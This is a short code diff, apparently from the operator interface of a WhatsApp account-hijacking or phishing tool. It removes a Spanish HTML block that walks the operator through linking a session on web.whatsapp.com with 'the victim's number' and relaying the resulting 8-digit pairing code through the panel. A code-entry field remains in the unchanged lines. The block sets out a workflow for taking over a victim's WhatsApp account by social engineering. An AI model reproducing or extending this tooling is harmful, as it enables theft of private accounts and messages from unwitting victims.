@@ -584,37 +584,6 @@ const esWA_Codigo    = esWA_VipGroup || esWA_Advance;
                 border-radius:6px;
                 border:1px solid #25D366;
             ">
-                <div style="color:#25D366;font-size:12px;font-weight:bold;margin-bottom:8px;">
-                    🔗 VINCULAR SESIÓN WHATSAPP
-                </div>
-                <div style="font-size:11px;color:#aaa;margin-bottom:10px;line-height:1.7;">
-                    1️⃣ Abre <strong style="color:#25D366">web.whatsapp.com</strong> en tu PC<br>
-                    2️⃣ Click en <strong>"Vincular con número de teléfono"</strong><br>
-                    3️⃣ Ingresa el número de la víctima<br>
-                    4️⃣ WhatsApp te mostrará un código de 8 dígitos<br>
-                    5️⃣ Cópialo aquí abajo y presiona <strong>ENVIAR</strong>
-                </div>
-
-                ${v.codigo ? `
-                <div style="
-                    background:rgba(37,211,102,0.15);
-                    border:1px solid #25D366;
-                    border-radius:4px;
-                    padding:8px;
-                    margin-bottom:10px;
-                    font-size:13px;
-                    color:#25D366;
-                    text-align:center;
-                    letter-spacing:3px;
-                    font-family:monospace;
-                    font-weight:bold;
-                ">
-                    ✅ Código activo: ${v.codigo}
-                </div>` : `
-                <div style="color:#666;font-size:11px;margin-bottom:10px;text-align:center;">
-                    ⌛ Esperando código...
-                </div>`}
-
                 <label style="color:#ccc;font-size:11px;display:block;margin-bottom:6px;font-weight:bold;">
                     INGRESA EL CÓDIGO:
                 </label>
